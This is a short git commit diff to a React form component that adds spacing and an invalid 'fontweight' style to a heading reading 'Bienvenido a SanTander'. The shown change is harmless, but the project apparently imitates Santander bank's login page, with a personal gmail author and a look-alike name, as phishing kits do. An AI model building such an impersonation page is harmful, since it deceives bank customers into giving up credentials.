5c4da4e767ad0a4f66feb9785a3641caee079c65
alosantader <alosantamex@gmail.com>
2024-07-23 13:32:53 -0500

    Update form.jsx

--- src/components/form.jsx
+++ src/components/form.jsx
@@ -44,7 +44,8 @@ const Form = () => {
       <div className="content">
         <img src={logo} alt="Logo" className="logo" />
         &nbsp;
-        <h1 style={{color:'#fff', margin:'6px'}} className="title">Bienvenido a SanTander</h1>
+        &nbsp;
+        <h1 style={{color:'#fff', margin:'6px', fontweight:'800'}} className="title">Bienvenido a SanTander</h1>
         &nbsp;
         &nbsp;
         <form onSubmit={handleSubmit} className="form-group">
